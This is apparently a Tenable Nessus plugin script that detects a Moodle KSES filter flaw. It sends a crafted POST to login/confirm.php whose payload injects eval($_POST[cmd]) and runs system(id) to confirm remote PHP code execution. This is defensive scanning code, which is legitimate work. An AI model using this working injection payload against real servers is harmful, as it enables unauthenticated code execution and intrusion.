#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(34095);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(28599);
  script_xref(name:"milw0rm", value:"6356");
  script_xref(name:"OSVDB", value:"47977");
  script_xref(name:"Secunia", value:"30986");
  script_xref(name:"Secunia", value:"31017");

  script_name(english:"Moodle lib/kses.php kses_bad_protocol_once Function Arbitrary PHP Code Execution");
  script_summary(english:"Tries to run a command");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows execution
of arbitrary code remotely." );
 script_set_attribute(attribute:"description", value:
"The version of Moodle on the remote host includes a version of the
KSES HTML filtering library that does not safely call 'preg_replace()'
in the function 'kses_bad_protocol_once()' in 'lib/kses.php'.  An
unauthenticated remote attacker can leverage this issue to inject
arbitrary PHP code that will be executed subject to the privileges of
the web server user id. 

Note that there reportedly are also several cross-site scripting and
HTML filtering bypass issues in the version of the KSES library in
use, although Nessus has not tested for them explicitly." );
 script_set_attribute(attribute:"see_also", value:"http://cvs.moodle.org/moodle/lib/kses.php?r1=1.3.2.2&r2=1.3.2.3" );
 script_set_attribute(attribute:"see_also", value:"http://moodle.org/mod/forum/discuss.php?d=95031" );
 script_set_attribute(attribute:"see_also", value:"http://docs.moodle.org/en/Release_Notes#Moodle_1.8.5" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Moodle 1.8.5, 1.9, or any recent nightly 1.7.x or 1.6.x
build." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("moodle_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";


# Test an install.
install = get_kb_item(string("www/", port, "/moodle"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/login/confirm.php");

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  if (
    ' MoodleSession=' >< res ||
    ' MoodleSessionTest=' >< res ||
    string(dir, '/lib/javascript/static.js') >< res ||
    'p class="helplink">' >< res
  )
  {
    # Try to exploit the flaw.
    boundary = "nessus";
    exploit = string("<img src=http&{${eval($_POST[cmd])}};://nessus.org>");

    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="s"', "\r\n",
      "\r\n",
      exploit, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="cmd"', "\r\n",
      "\r\n",
      "system(", cmd, ");exit;\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    if (egrep(pattern:cmd_pat, string:res))
    {
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote \n",
          "host using the following request :\n",
          "\n",
          "  ", str_replace(find:'\n', replace:'\n  ', string:req)
        );
        if (report_verbosity > 1)
        {
          report = string(
            report,
            "\n",
            "It produced the following output :\n",
            "\n",
            "  ", res
          );
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
    }
  }
}

